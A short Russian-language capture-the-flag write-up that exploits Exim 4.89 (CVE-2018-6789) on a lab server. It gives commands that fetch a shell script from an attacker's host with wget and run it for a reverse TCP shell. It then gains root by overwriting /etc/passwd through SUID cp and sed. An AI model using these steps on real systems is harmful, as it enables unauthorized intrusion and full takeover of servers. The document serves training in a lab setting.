# Давно всем известная уязвимость

Кажется почта сконфигурирована некорректно

# WriteUp

Засканив nmap`ом мы обнаруживаем, что на сервере крутится exim4 версии 4.89.

Под который давно имеется exploit (CVE-2018-6789)|

Подробнее можно почитать [Команда упасть](https://xakep.ru/2018/05/07/exim-4-exploit/)

Тут приложен [exploit](exp.py)

Дополнительный файл с [шеллом](shell3)

Последовательность использования команд в эксплоите

1. **threaded_brute_force(0x10)** - после успешного нахождения смещения его нужно указать в следующих командах
2. **execute_command(0x3ae(заменить на ваше смещение), "/usr/bin/wget -O /tmp/s3 http://ваш ip-адрес/shell3")**
<br>**execute_command(0x3ae(заменить на ваше смещение), "/usr/bin/wget -O /tmp/linpeas.sh http://ваш ip-адрес/linpeas.sh")**
<br>**execute_command(0x3ae(заменить на ваше смещение), "/bin/bash /tmp/s3")** - тут установиться **reverse tcp** (соединение может обрываться, необходимо перезапускать данную команду)

Не забываем поднять у себя **http** сервер, где будут лежать **shell** и **linpeas**


3. Последовательно выполняем данные команды

**cd /tmp && sh linpeas.sh**

**linpeas** - выведет нам, что на командах **cp** и **sed** есть **suid** права.

**cp /etc/passwd . && var="root:\$1\$bitch4\$xr74XTCV39\/WpLloi2f.50:0:0:root:\/root:\/bin\/bash" && sed -i "1s/.\*/$var/" passwd && cp passwd /etc/passwd**

**echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py**
<br>**python /tmp/asdf.py**

**su root**

Флаг лежит в директории **/root**

**/root/.fl4g**


# Flag
RDGCTF{kakoy-to_flag}
